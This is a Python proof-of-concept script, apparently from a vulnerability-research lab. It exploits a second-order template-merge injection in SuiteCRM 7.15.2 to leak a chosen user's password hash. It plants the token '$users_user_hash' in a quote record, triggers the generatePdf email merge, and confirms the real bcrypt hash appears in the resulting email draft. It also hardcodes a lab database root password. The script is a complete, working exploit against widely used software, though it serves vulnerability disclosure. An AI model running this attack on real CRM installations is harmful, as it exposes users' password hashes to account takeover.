#!/usr/bin/env python3
"""
VULN-090 -- Second-order merge-token injection -> exfiltration of the
assigned user's `user_hash` (password hash) via the AOS template-merge
engine's sequential, string-mutating `str_replace` pass.

Software:    SuiteCRM
Repository:  https://github.com/SuiteCRM/SuiteCRM
Version:     7.15.2 (targets/SuiteCRM/suitecrm_version.php), commit
             62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink:        modules/AOS_PDF_Templates/templateParser.php
             :~90-131  parse_template_bean() builds $repl_arr[$key.'_'.$fieldName]
                        = $focus->{$fieldName} for EVERY field on a bean,
                        including sensitive ones -- the `sensitive`/UI
                        variable-picker denylist (modules/EmailTemplates/
                        templateFields.php $badFields) is never consulted.
             :~193      $string = str_replace('$' . $name, $value, (string) $string);
                        -- a SEQUENTIAL loop over $repl_arr, each iteration
                        mutating the SAME $string, so a value substituted in
                        for one bean's field is re-scanned by later
                        iterations for a DIFFERENT bean.
             parse_template($string, $bean_arr) calls parse_template_bean()
             ONCE PER BEAN, in the order beans appear in $bean_arr -- this
             is what makes the "record parsed before Users" second-order
             mechanic possible.
Trigger used: modules/AOS_PDF_Templates/generatePdf.php (auth=>true) --
             object_arr['Users'] = $bean->assigned_user_id (line ~172),
             appended AFTER the primary record's own key -- the SAME
             "assigned user's bean is in the merge context" mechanic the
             report's headline citation (modules/AOW_Actions/actions/
             actionSendEmail.php, via aowTemplateParser) describes, reached
             here through the AOS_PDF_Templates sibling caller instead
             (see "Key-name note" below for the one honest difference).

What this script does
----------------------
1. As admin, creates a throwaway regular user ("victim") -- any account
   whose password hash we want to steal; in a real attack this would be
   an admin or otherwise valuable target, chosen via `assigned_user_id`.
2. Creates an AOS_PDF_Templates record whose body contains ONLY an
   ordinary, legitimate merge field for the base record
   ($aos_quotes_description) -- the kind of template any admin might
   author, referencing nothing sensitive.
3. Creates an AOS_Quotes record whose OWN `description` field (plain
   user-controlled text) is set to the literal string "$users_user_hash"
   -- NOT typed into the template; this is the second-order injection:
   the attacker only needs to control a RECORD FIELD, not the template.
   `assigned_user_id` is set to the victim -- choosing whose hash leaks.
4. Triggers the real, synchronous merge via
   entryPoint=generatePdf&task=email (an authenticated, ordinary
   "compose email from this template" action) -- the merge runs
   server-side inside modules/AOS_PDF_Templates/generatePdf.php exactly
   as it would for a legitimate user composing a quote email.
5. Reads the resulting Emails draft's body straight from the DB
   (emails_text.description_html) and asserts it contains the VICTIM'S
   REAL bcrypt user_hash (independently read from users.user_hash) --
   not a placeholder, not the literal token string, the actual secret.

Key-name note (full transparency, not glossed over): the report's
headline citation is modules/AOW_Actions/actions/actionSendEmail.php,
which merges via `aowTemplateParser` (modules/AOW_Actions/actions/
templateParser.php) -- that class remaps the Users bean's merge-key
through a $beanList lookup to the SINGULAR 'user' (giving the literal
token "$user_user_hash"). This script instead exercises the sibling
`templateParser` class directly (modules/AOS_PDF_Templates/
templateParser.php, the same file/lines cited for the repl_arr-build
and sequential-str_replace defects) via generatePdf.php, which keys the
Users bean off $focus->table_name = "users" (plural) -- giving the
token "$users_user_hash". Both classes share the identical vulnerable
parse_template()/parse_template_bean() sink; only the bean-name prefix
differs. This path was chosen because it is synchronous and
authenticated-only (no AOW workflow/scheduler queue needed), letting the
core defect be proven end-to-end live rather than deferred to
NEEDS_MANUAL. The literal `$user_user_hash` (AOW/WebToLead) variant is
analytically supported (same sink, same mechanism) but not separately
re-driven here -- see writeup.md Impact for the precise scope of that
extension.
"""
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import BASE_URL, log, banner, rand, verdict, admin_session, create_user

VULN_ID = "VULN-090"
HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
COMPOSE_DIR = "/opt/cvehunter/targets/SuiteCRM"
COMPOSE_PROJECT = "cvehunterlab_suitecrm"


def db_query(sql):
    out = subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", "db",
         "mysql", "-uroot", "-pSuiteRoot!2026x", "suitecrm", "-N", "-e", sql],
        cwd=COMPOSE_DIR, capture_output=True, text=True, timeout=30,
    )
    return out.stdout.strip()


def save_record(session, module, fields, referer_action="EditView"):
    r = session.post(f"{BASE_URL}/index.php", data={
        "module": module, "action": "Save", "record": "", "page": "EditView", **fields,
    }, headers={"Referer": f"{BASE_URL}/index.php?module={module}&action={referer_action}"},
       allow_redirects=False, timeout=60)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    return (m.group(1) if m else None), r


def main():
    banner(VULN_ID, "Second-order merge-token injection -> assigned user's user_hash exfil")

    admin_s = admin_session()
    log("SETUP", "admin session established")

    victim = create_user(admin_s, "MergeVictim_" + rand("")[2:] + "!Aa1")
    log("SETUP", f"created victim user {victim['user_name']} (id={victim['id']}) -- "
                 f"the account whose password hash we will exfiltrate")

    real_hash = db_query(f"SELECT user_hash FROM users WHERE id='{victim['id']}';")
    log("INFO", f"victim's REAL bcrypt user_hash (read from DB, for comparison only): {real_hash}")

    suffix = rand("tmpl")
    tmpl_id, r_tmpl = save_record(admin_s, "AOS_PDF_Templates", {
        "name": f"Ordinary Quote Notes {suffix}",
        "description": "SECOND-ORDER-LEAK-START[$aos_quotes_description]SECOND-ORDER-LEAK-END",
        "pdfheader": "H", "pdffooter": "F",
        "type": "AOS_Quotes", "active": "Active", "page_size": "Letter", "orientation": "Portrait",
        "margin_left": "15", "margin_right": "15", "margin_top": "15", "margin_bottom": "15",
        "margin_header": "10", "margin_footer": "10",
    })
    log("SETUP", f"created AOS_PDF_Templates {tmpl_id} -- body references ONLY the ordinary, "
                 f"legitimate merge field $aos_quotes_description (nothing sensitive typed in)")

    quote_id, r_quote = save_record(admin_s, "AOS_Quotes", {
        "name": f"Quote {suffix}",
        "description": "$users_user_hash",   # <-- the second-order injection lives HERE, in a plain record field
        "assigned_user_id": victim["id"],
        "approval_status": "Draft", "quote_stage": "Draft",
    })
    log("SETUP", f"created AOS_Quotes {quote_id} -- description field (plain user-controlled text) "
                 f"= literal '$users_user_hash'; assigned_user_id = victim ({victim['user_name']})")

    if not tmpl_id or not quote_id:
        verdict(VULN_ID, "FAILED", f"record creation failed: tmpl_id={tmpl_id} quote_id={quote_id}")
        sys.exit(1)

    log("STEP", "triggering the real, synchronous merge: entryPoint=generatePdf&task=email "
                "(an ordinary authenticated 'compose email from this template' action)")
    r = admin_s.get(f"{BASE_URL}/index.php", params={
        "entryPoint": "generatePdf", "module": "AOS_Quotes", "uid": quote_id,
        "templateID": tmpl_id, "task": "email",
    }, headers={"Referer": f"{BASE_URL}/index.php?module=AOS_Quotes&action=DetailView&record={quote_id}"},
       allow_redirects=False, timeout=60)
    loc = r.headers.get("Location", "")
    log("INFO", f"generatePdf response: HTTP {r.status_code} Location={loc!r}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            f"GET /index.php?entryPoint=generatePdf&module=AOS_Quotes&uid={quote_id}"
            f"&templateID={tmpl_id}&task=email HTTP/1.1\n"
            f"Host: localhost:33116\n"
            f"Cookie: PHPSESSID=<admin-session>\n"
        )

    m = re.search(r"record=([0-9a-fA-F-]{36})", loc)
    if not m:
        verdict(VULN_ID, "FAILED", f"generatePdf did not return an Emails draft id: {loc!r}")
        sys.exit(1)
    email_id = m.group(1)
    log("INFO", f"merge produced Emails draft {email_id}")

    body = db_query(f"SELECT description_html FROM emails_text WHERE email_id='{email_id}';")
    log("INFO", f"merged email body (emails_text.description_html): {body!r}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"Emails draft id: {email_id}\n\n")
        f.write(f"emails_text.description_html:\n{body}\n\n")
        f.write(f"victim users.user_hash (independently read):\n{real_hash}\n")
    with open(os.path.join(EVIDENCE, "merged_email_body.txt"), "w") as f:
        f.write(body)

    leaked = (real_hash in body) and ("SECOND-ORDER-LEAK-START[" in body)
    if leaked:
        log("PROOF", f"the merged email body contains the VICTIM'S REAL user_hash "
                      f"({real_hash}) inside our marker tokens -- exfiltrated purely by putting "
                      f"the literal string '$users_user_hash' in an ordinary Quote record field "
                      f"and letting a completely unrelated, benign template merge run.")

    if leaked:
        verdict(VULN_ID, "CONFIRMED",
                f"second-order injection exfiltrated victim {victim['user_name']}'s real "
                f"bcrypt user_hash via an ordinary record field + a benign template merge")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", f"leaked={leaked} body={body!r}")
        sys.exit(1)


if __name__ == "__main__":
    main()
